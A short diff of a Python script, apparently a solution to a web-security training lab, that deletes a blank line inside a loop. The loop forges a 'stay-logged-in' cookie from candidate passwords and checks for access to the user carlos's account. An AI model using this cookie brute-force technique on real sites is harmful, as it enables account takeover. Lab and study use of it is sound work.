@@ -39,7 +39,6 @@ def main():
 
             cookie_value = get_cookie_value(password)
             client.cookies.set('stay-logged-in', cookie_value, domain=f'{host[8:]}')
-
             r = client.get(f'{host}/my-account', allow_redirects=False)
             if 'Your username is: carlos' in r.text:
                 print()
